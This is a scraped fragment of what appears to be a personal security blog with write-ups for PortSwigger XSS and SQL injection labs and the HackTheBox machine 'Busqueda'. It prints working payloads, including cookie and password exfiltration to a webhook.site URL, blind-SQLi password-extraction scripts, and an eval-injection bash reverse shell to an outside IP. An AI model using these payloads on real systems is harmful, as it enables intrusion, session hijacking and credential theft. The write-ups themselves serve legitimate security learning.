challenge, I have tried entering \u0026quot;\u0026gt;\u0026lt;script\u0026gt; in search and checked where the values is reflected. On checking the source, we can see it\u0026rsquo;s in \u0026lt;h1\u0026gt; tag, where it is encoded, and second is in value tag, again encoded. We cannot do anything inside \u0026lt;h1\u0026gt; so we will close value tag and add new onfocus attribute and check for XSS.\nSolution: \u0026quot; autofocus onfocus=alert(1) x=\u0026quot;\n10. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.\nSimilar to last challenge, I have entered abc, def etc in comment section and made a comment, while checking source code we can see that in href URL is present. We can enter javascript:alert(1) in URL to make it work.\nSolution: javascript:alert(1)\n11. Lab: Reflected XSS in canonical link tag This lab reflects user input in a canonical link tag and escapes angle brackets.\nTo solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.\nPlease note that the intended solution to this lab is only possible in Chrome.\nNoticed in this lab there is no search field. Where should we enter payload? In the URL itself after /? If we try to use /?abcd in website and check the source if it is getting reflected.\nYes, it does! in \u0026lt;link\u0026gt;. So we have to break out of that string using ' and then use onclick in order to call alert. But for this lab we have to use access key. So we will set accesskey to X and finally we can able to generate a payload out of it.\nSolution: Payload ?'accesskey='x'onclick='alert(1)\n12. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.\nwe have to escape quote in order to make our exploit work. If we search \u0026lsquo;abc\u0026rsquo; and check source, we will see it is inside a quote.\nIf we escape the quote, close script tag and then alert with new script tags then it will give XSS.\nSolution: '\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n13. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.\nI have used similar payload from previous challenge, and we can observe that angle bracket is encoded.\nso we will simply use '; to escape string character and use alert followed by // to comment everything after the alert.\nSolution: ';alert(1)//\n14. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.\nIf you try with previous payload, you will notice it will add \\ to escape ' character. What we will do it add one more backslash \\ so it will backslash backslash. Sounds weird, haha.\nSolution: \\';alert(1)//\n15. Lab: Reflected XSS in a JavaScript URL with some characters blocked This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.\nAt first glance of website, there is no search functionality. But when you visit a blog website the URL will be /post?postId=2 if we append 2\u0026amp;abc in postId then we can see abc is reflected in source code.\nNext, I have tried escaping ' and a tag using this payload 2\u0026amp;'\u0026lt;/a\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; but everything is encoded.\nIn order to solve this lab, we have to understand this article - https://portswigger.net/research/xss-without-parentheses-and-semi-colons. In order to make our XSS work, we have to close } bracket. So \u0026amp;'} will be the starting point for this challenge. Next we have the access to JavaScript. We will define a variable named as foo and then throw an exception with alert 1337.\nSolution: 5\u0026amp;'},foo=foo=\u0026gt;{throw/**/onerror=alert,1337},toString=foo,window+'',{foo:'\n16. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve this lab, submit a comment that calls the alert function when the comment author name is clicked.\nLet\u0026rsquo;s inspect the comment section by submitting dummy data into the form.\nSo we we can see, in onclick we can able to bypass using website. So in order to bypass this I have made this payload http://google.com'');alert(1 but it seems when the user is clicked, it is redirecting us to http://google.com/'/');alert(1. Also it is escaping quote in onclick. So the payload will be encoded with \u0026amp;apos;.\nSolution: http://google.com?#\u0026amp;apos;-alert(1)-\u0026amp;apos;\n17. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.\nIf we look at source code, it is having template string. We just have to use this format in order to get the flag. ${}\nSolution: ${alert(1)}\n18. Lab: Exploiting cross-site scripting to steal cookies This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim\u0026rsquo;s session cookie, then use this cookie to impersonate the victim.\nStarting with this challenges, we will have to see if it is popping alert, so simply using \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; we give us the idea of where the alert is getting popped.\nPayload: \u0026quot;\u0026gt;\u0026lt;script\u0026gt;document.location=\u0026quot;https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8?c=\u0026quot;+document.cookie\u0026lt;/script\u0026gt;. Though this is valid payload, we can also use alternate payload: \u0026lt;script\u0026gt;fetch(\u0026quot;https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8?cookie=\u0026quot;+document.cookie);\u0026lt;/script\u0026gt;\nSolution: Change the cookie and go to /my-account and it will solve the lab\n19. Lab: Exploiting cross-site scripting to capture passwords This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim\u0026rsquo;s username and password then use these credentials to log in to the victim\u0026rsquo;s account.\nSo, we have to create a password input and on changing the password, we have to get the value to our webhook. The following payload should suppose to work, but I am not seeing any results on webhook.\n\u0026lt;input type=password name=password onchange=\u0026quot;if(this.value.length)fetch(\u0026quot;https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8?pass=\u0026quot;+this.value);\u0026quot;\u0026gt;\nWhen I checked the solution - it has similar payload\n\u0026lt;input name=username id=username\u0026gt;\u0026lt;input type=password name=password onchange=\u0026quot;if(this.value.length)fetch('https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});\u0026quot;\u0026gt;\nSolution: When we get the username and password, by login in it will solve the lab.\n20. Lab: Exploiting XSS to bypass CSRF defenses This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.\nYou can log in to your own account using the following credentials: wiener:peter\nIf we login with this credentials, we will see there is an update email functionality. Just for testing we will try to change email of some random user asdf@test.com and what we noticed from this browser is sending post request to /my-account/change-email with email and csrf token. So, we can do CSRF if we find the token and using XSS we can get all the things from DOM. So let\u0026rsquo;s build exploit. Starting with the CSRF token, we can use getElementsByName to grab token and using fetch we will make a post request with random email and the token. Sending it in comment section and it will solve the lab.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; window.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function() { var token = document.getElementsByName(\u0026#39;csrf\u0026#39;)[0].value var data = new FormData(); data.append(\u0026#39;csrf\u0026#39;, token); data.append(\u0026#39;email\u0026#39;, \u0026#39;random@gmail.com\u0026#39;); fetch(\u0026#39;/my-account/change-email\u0026#39;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: data }); }); \u0026lt;/script\u0026gt; Solution: Use above script in comment section.\n","description":"This blog will contain all the writeups for XSS Labs from Portswigger","id":9,"section":"posts","tags":["Portswigger","XSS"],"title":"Portswigger XSS Writeups","uri":"https://g4nd1v.github.io/posts/portswigger-xss/"},{"content":"1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.\nSelect any category to view products from that category and when I inserted ' it gave internal server error, next thing I have tried it simple OR query and it gave all the results because the resultant query will look like this:\n1 SELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; OR 1=1-- -\u0026#39; AND released = 1 Solution: /filter?category=Pets' OR 1=1-- -\n2. Lab: SQL injection vulnerability allowing login bypass This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.\nThere in my accounts there is a login form and we have to login with administrator. With administrator as username and administrator as password, it gave invalid username or password. The query might be something like this SELECT * FROM users WHERE username = 'administrator' AND password = 'bluecheese'. So if we try to use similar technique from last challenge (using OR query) we can able to solve this challenge too.\nSolution: username will be administrator OR 1=1-- - and password can be anything.\n3. Lab: SQL injection with filter bypass via XML encoding This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables.\nThe database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user\u0026rsquo;s credentials, then log in to their account.\nNow, in this challenge if we click on any products and scroll down, we can see Check Stock button. We can see the request looks something like this.\nWe have to use to html entity in CyberChef in order to convert our payload into HTML entity to bypass WAF. Let\u0026rsquo;s get username first then we will get password the same way.\nWe got 3 usernames from this\nadministrator\rcarlos\rwiener With similar technique we will get all the passwords\n9li7uj3bs5dna7xwe50k\rmmz0u9wkk04i83avtgix\ra1zfu11iq22sqmw7dmhd Solution: Login with administrator and 9li7uj3bs5dna7xwe50k will solve the lab.\n4. Lab: SQL injection attack, querying the database type and version on Oracle This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.\nIt seems we have to grab the banner from the database. So firstly before making any union query, we have to check how many columns are required. So we have to use order by query for that Gifts' ORDER BY 2-- From 3 we are getting error, so we can say, we require 2 columns.\nNow, making simple version union query will solve the lab.\nSolution: Gifts' UNION SELECT banner, NULL FROM v$version-- -\n5. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.\nSimilar to previous challenge, just syntax is different.\nSolution: '+UNION+SELECT+%40%40version,'test'%23\n6. Lab: SQL injection attack, listing the database contents on non-Oracle databases This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.\nIn this challenge, we have to get username and password from database. User\u0026rsquo;s table is not given, so we have to use information_schema in order to get tables from database.\nBefore using UNION query, we always have to check how many columns are required. For that we will use Gifts' ORDER BY 1-- query. After ORDER BY 3 we are getting Internal Server Error, so we can say total 2 columns are required in UNION query. Next thing we will do is, use information_schema to retrieve tables - Gifts' UNION SELECT TABLE_CATALOG, TABLE_NAME FROM information_schema.tables--\nWe found the table users_knbmer. Alright, now that we have table, we will find columns using the Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'users_knbmer'-- query.\nGot 2 columns for username and password that is username_mbsmup and password_xwqvyt. Now we have to get username and password from user\u0026rsquo;s table using this query - Gifts' UNION SELECT username_mbsmup, password_xwqvyt from users_knbmer--\nSolution: Login with administrator:gzor4sfsnzq0zoectxhp will solve the lab.\n7. Lab: SQL injection attack, listing the database contents on Oracle This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.\nAs as previous challenge, just syntax is different! So starting with UNION query to get required columns and we found 2 columns are required: query Gifts' ORDER BY 1--. Next thing is to get table name: query Gifts' UNION SELECT OWNER, TABLE_NAME FROM all_tables--. Wait a sec, how did I know we have to grab OWNER and TABLE_NAME? You can use online compilers in order to check which what kind of data are present in database. Check this out: https://onecompiler.com/oracle/434u59np3\nMoving to next part, grab column names: Gifts' UNION SELECT TABLE_NAME, COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_ZJOEDW'--. We found username and password USERNAME_CYNJET, PASSWORD_MQKNXO.\nFinal part is to get the content of the columns: Gifts' UNION SELECT USERNAME_CYNJET, PASSWORD_MQKNXO from USERS_ZJOEDW--\nSolution: Login with administrator:qlwc755mwk6ge1qsb6uu will solve the lab.\n8. Lab: SQL injection UNION attack, determining the number of columns returned by the query This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.\nTo solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.\nWe simply have to determine number of columns in the database using UNION NULL queries\nSolution: Pets' UNION SELECT NULL,NULL,NULL--\n9. Lab: SQL injection UNION attack, finding a column containing text This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.\nThe lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.\nLike last challenge, we have to determine number of column using UNION NULL query and then we have to retrieve the string.\nSolution: Gifts' UNION SELECT NULL,'n1okPs',NULL--\n10. Lab: SQL injection UNION attack, retrieving data from other tables This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.\nVery straightforward challenge, we have been given the table name with column names, we just have to use union query to get creds and then login with that creds. Query: Gifts' UNION SELECT username, password from users--\nSolution: Login with this credentials administrator:1hrjomh0ztxpf3e44mh5\n11. Lab: SQL injection UNION attack, retrieving multiple values in a single column This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.\nFor this challenge, we have to determine how many columns are required and which column contains text and after that we have to concentrate using || ~ || to get username and password with the following query we can able to retrieve information.\nQuery: Pets' UNION SELECT NULL,username || '~' || password FROM users--\nSolution: Login with administrator:taponkgg8eqvhi5679wr\n12. Lab: Blind SQL injection with conditional responses This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nSo, in theory we have to check if the website is vulnerable to SQL Injection with simple condition query. So here is the true case of the query with payload ' AND 1=1--\nWe can see Welcome back! in response. Now let\u0026rsquo;s try to execute false payload query ' AND 1=2--\nWe cannot be able to see Welcome back! in response. So this means that the website is vulnerable to SQL Injection attack. Perfect! Now let\u0026rsquo;s try to use substring query in order to get password.\nSimply using substring script will give us the password. We have to check the character at each position, so I have wrote python script to do the same. If you want to use the same script, you have to change trackingId, session, csrf values.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import string characters = string.ascii_lowercase + string.digits print(characters) passwd = \u0026#34;\u0026#34; for position in range(20): for character in characters: print(f\u0026#39;trying {character} at position {position}\u0026#39;) url = \u0026#39;https://0aa2005204fb8621828dc511004c0081.web-security-academy.net/login\u0026#39; json_data = { \u0026#39;csrf\u0026#39;: \u0026#39;LvxFkchjMqheMJHFbzdAUdFl511exmyD\u0026#39;, \u0026#39;username\u0026#39;: \u0026#39;abc\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;abc\u0026#39; } query = f\u0026#34;S4CgBSuHDyj19tCQ\u0026#39; AND (SELECT SUBSTRING(password,{position+1},1) FROM users WHERE username=\u0026#39;administrator\u0026#39;)=\u0026#39;{character}\u0026#34; cookies = {\u0026#39;TrackingId\u0026#39;: query, \u0026#39;session\u0026#39;: \u0026#39;TUhkJtpGRKK1bUBjaE0pO6BFKKnIgviJ\u0026#39;} response = requests.post(url, cookies=cookies, data=json_data) if \u0026#39;welcome back\u0026#39; in response.text.lower(): passwd += character break position += 1 print(passwd) print(passwd) Solution: Login with administrator:trxkur84glam1e9aymx9\n13. Lab: Blind SQL injection with conditional errors This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nSimilar python program as before, just the query is different. If you want to use the same program, change csrf, trackingID, session and url.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import string characters = string.ascii_lowercase + string.digits print(characters) passwd = \u0026#34;\u0026#34; for position in range(22): for character in characters: print(f\u0026#39;trying {character} at position {position}\u0026#39;) url = \u0026#39;https://0aaf008204b0f542804862ac00db00ac.web-security-academy.net/login\u0026#39; json_data = { \u0026#39;csrf\u0026#39;: \u0026#39;YC3io2kYSmIz1bpUJKkj2Sk6O3TXEDKC\u0026#39;, \u0026#39;username\u0026#39;: \u0026#39;abc\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;abc\u0026#39; } query = f\u0026#34;7XoGU7FEnjwaB98s\u0026#39;||(SELECT CASE WHEN SUBSTR(password,{position+1},1)=\u0026#39;{character}\u0026#39; THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM users WHERE username=\u0026#39;administrator\u0026#39;)||\u0026#39;\u0026#34; cookies = {\u0026#39;TrackingId\u0026#39;: query, \u0026#39;session\u0026#39;: \u0026#39;03G1OHc8zcgtwCaq8LeFLYBC4Id5BvvX\u0026#39;} response = requests.post(url, cookies=cookies, data=json_data) if \u0026#39;internal server error\u0026#39; in response.text.lower(): passwd += character break position += 1 print(passwd) print(passwd) Solution: Login with administrator:se92ecqvswnwp82oyyj8 will solve the lab\n14. Lab: Visible error-based SQL injection This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.\nThe database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.\nJust by adding a quote will give us the error.\nNow, let\u0026rsquo;s use CASE query\nIt says the argument must be type boolean, so we have to modify our query based on this error. Modified query is ' AND 1=CAST((SELECT 1) AS int)-- which will not give any error, so that means, the query is valid. Now, let\u0026rsquo;s try to grab usernames from database using this query ' AND 1=CAST((SELECT username FROM users) AS int)--\nThe error says more than one row returned by a subquery used as an expression, so we have to limit the results to 1. So the resultant query will be ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- which will give us the username administrator. Now in order to get the password, simply change username to password in query ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--\nSolution: Login with administrator:b2jg0ij1mwruscn3yflt will solve the lab\n15. Lab: Blind SQL injection with time delays This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nTo solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.\nSimply using sleep payload will solve the lab\nSolution: '||pg_sleep(10)--\n16. Lab: Blind SQL injection with time delays and information retrieval This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nSimilar to above scripts, we just have to use query with delay and track response timings.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests import string import time characters = string.ascii_lowercase + string.digits print(characters) passwd = \u0026#34;\u0026#34; for position in range(22): for character in characters: print(f\u0026#39;trying {character} at position {position}\u0026#39;) url = \u0026#39;https://0a3300a603048502810f0db100c3000f.web-security-academy.net/login\u0026#39; json_data = { \u0026#39;csrf\u0026#39;: \u0026#39;IZyXQoM5Uyr9E12EgInZhjDJd4k7YRpt\u0026#39;, \u0026#39;username\u0026#39;: \u0026#39;abc\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;abc\u0026#39; } query = f\u0026#34;2Feork45FYPU1V8J\u0026#39;%3BSELECT+CASE+WHEN+(username=\u0026#39;administrator\u0026#39;+AND+SUBSTRING(password,{position+1},1)=\u0026#39;{character}\u0026#39;)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--\u0026#34; cookies = {\u0026#39;TrackingId\u0026#39;: query, \u0026#39;session\u0026#39;: \u0026#39;mDukomvL6ik2gZqS2CujoeB2Mq8akg7m\u0026#39;} a = time.time() response = requests.post(url, cookies=cookies, data=json_data) b = time.time() if b - a \u0026gt; 5: passwd += character break position += 1 print(passwd) print(passwd) Solution: Login with administrator:6u53hrwurnzopzilf5rx\n","description":"This blog will contain all the writeups for SQL Injection Labs from Portswigger","id":10,"section":"posts","tags":["Portswigger","SQL"],"title":"Portswigger SQL Injection Writeups","uri":"https://g4nd1v.github.io/posts/portswigger-sql-injection/"},{"content":"Busqueda Title Busqueda Description Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user and Gitea account. Further analysis of the system checkup script and source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges. Difficulty Easy Maker kavigihan Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 └──╼ $nmap -sC -sV -oA nmap/nmap 10.129.75.187 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 04:32 CST Nmap scan report for 10.129.75.187 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b🆎d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds It seems there are 2 ports open - ssh and http. Moreover, http port is redirected to searcher.htb, so we will add that in /etc/hosts.\nCVE Here is the homepage of the website, where we can see it is using Searchor 2.4.0\nAfter doing a quick google, we found a vulnerability - commit - CVE-2023-43364. So basically it was using eval function, and we all know what it can lead to, right?\nSo this is the vulnerable code\n1 2 3 url = eval( f\u0026#34;Engine.{engine}.search(\u0026#39;{query}\u0026#39;, copy_url={copy}, open_web={open})\u0026#34; ) Let\u0026rsquo;s see what parameters we can able to manipulate using burpsuite.\nUser We have access to two parameters, that is engine and query. If we try to inject manually, we can use this payload\npayload - ' + __import__('os').popen('bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.36/4444 0\u0026gt;\u0026amp;1\u0026quot;').read() + '\nOr else we can use direct exploits exploit - https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection\nWe will get the shell after running this payload\nNow, get full tty using this commands python3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;\rCtrl + Z\rstty raw -echo; fg\rThen it will continue the shell and just press enter(assuming you\u0026#39;re on kali) we will get user\u0026rsquo;s flag in home directory.\n1 2 svc@busqueda:~$ cat user.txt 533822c5c5e05cff7765a7f48afb916a Root In the home directory, I have noticed .gitconfig file and in that file we found a username named as cody.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 svc@busqueda:~$ ls -al total 40 drwxr-x--- 4 svc svc 4096 Dec 19 05:18 . drwxr-xr-x 3 root root 4096 Dec 22 2022 .. lrwxrwxrwx 1 root root 9 Feb 20 2023 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 svc svc 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 svc svc 3771 Jan 6 2022 .bashrc drwx------ 2 svc svc 4096 Feb 28 2023 .cache -rw-rw-r-- 1 svc svc 76 Apr 3 2023 .gitconfig drwxrwxr-x 5 svc svc 4096 Jun 15 2022 .local lrwxrwxrwx 1 root root 9 Apr 3 2023 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 svc svc 807 Jan 6 2022 .profile lrwxrwxrwx 1 root root 9 Feb 20 2023 .searchor-history.json -\u0026gt; /dev/null -rw-r----- 1 root svc 33 Dec 18 10:02 user.txt -rw------- 1 svc svc 1089 Dec 19 05:18 .viminfo svc@busqueda:~$ cat .gitconfig [user] email = cody@searcher.htb name = cody [core] hooksPath = no-hooks I have moved to the website directory that is /var/www/app and checked if I am getting anything out of it and in that directory I have found .git folder - on checking the config for that folder we got a subdomain gitea.searcher.htb with cody\u0026rsquo;s username and password. Adding this domain in our /etc/hosts and let\u0026rsquo;s visit the website.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 svc@busqueda:/var/www/app$ ls -al total 20 drwxr-xr-x 4 www-data www-data 4096 Apr 3 2023 . drwxr-xr-x 4 root root 4096 Apr 4 2023 .. -rw-r--r-- 1 www-data www-data 1124 Dec 1 2022 app.py drwxr-xr-x 8 www-data www-data 4096 Dec 18 10:02 .git drwxr-xr-x 2 www-data www-data 4096 Dec 1 2022 templates svc@busqueda:/var/www/app$ svc@busqueda:/var/www/app$ cd .git svc@busqueda:/var/www/app/.git$ ls branches config HEAD index logs refs COMMIT_EDITMSG description hooks info objects svc@busqueda:/var/www/app/.git$ cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main Username and password worked for cody and we found a repository.\nWell, the code present in repo is same as we found in /var/www/app folder, so not too interesting, moreover, it has no commit histories, no previous issues and pull requests, so I think it\u0026rsquo;s deadend. Moving to the next thing, sudo -l. But that will require a password. Cody\u0026rsquo;s password worked for SVC, so we\u0026rsquo;re good!\n1 2 3 4 5 6 7 8 9 svc@busqueda:/var/www/app/.git$ sudo -l [sudo] password for svc: Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * On running the file we can see,\nUsage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2)\rdocker-ps : List running docker containers\rdocker-inspect : Inpect a certain docker container\rfull-checkup : Run a full system checkup Let\u0026rsquo;s run docker-ps\n1 2 3 4 $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 960873171e2e gitea/gitea:latest \u0026#34;/usr/bin/entrypoint…\u0026#34; 23 months ago Up 20 hours 127.0.0.1:3000-\u0026gt;3000/tcp, 127.0.0.1:222-\u0026gt;22/tcp gitea f84a6b33fb5a mysql:8 \u0026#34;docker-entrypoint.s…\u0026#34; 23 months ago Up 20 hours 127.0.0.1:3306-\u0026gt;3306/tcp, 33060/tcp mysql_db By running docker-inspect with --format we can able to get IP address for mysql_db\nReference - https://docs.docker.com/reference/cli/docker/inspect/#examples command - sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mysql_db By running the command it will give us this IP address - 172.19.0.3.\nNow that we know the IP address, username and password, we can able to login with mysql command - mysql -h 172.19.0.3 